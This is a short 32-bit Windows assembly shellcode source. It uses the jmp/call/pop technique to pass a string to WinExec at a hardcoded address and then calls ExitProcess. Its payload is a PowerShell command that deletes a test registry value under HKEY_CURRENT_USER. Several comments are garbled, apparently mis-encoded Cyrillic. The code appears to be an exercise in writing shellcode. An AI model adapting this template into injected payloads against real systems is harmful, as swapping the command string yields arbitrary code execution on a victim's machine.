[BITS 32] 
global _start 
section .text 
_start: 
	jmp short GetCommand 
CommandReturn: 
    pop ebx     
    xor eax,eax 
    push eax 
    push ebx 
    mov ebx,0x76525230  
    call ebx     ; call WinExec(path, showcode). WinExec ������� �� ����� ��������� ��� ��������, ������� �� �������� ����.

    xor eax,eax     ;zero the register again, clears winexec retval. ����� �������� ���� ��� ��������� ������� ExitProcess
    push eax 
    mov ebx, 0x764ef380 
    call ebx     ; call ExitProcess(0). ��������
GetCommand:
    call CommandReturn ; ������ �������
    db "powershell -Command Remove-ItemProperty -Path  Registry::HKEY_CURRENT_USER\\Test\\ -Name Test"
	db 0x00
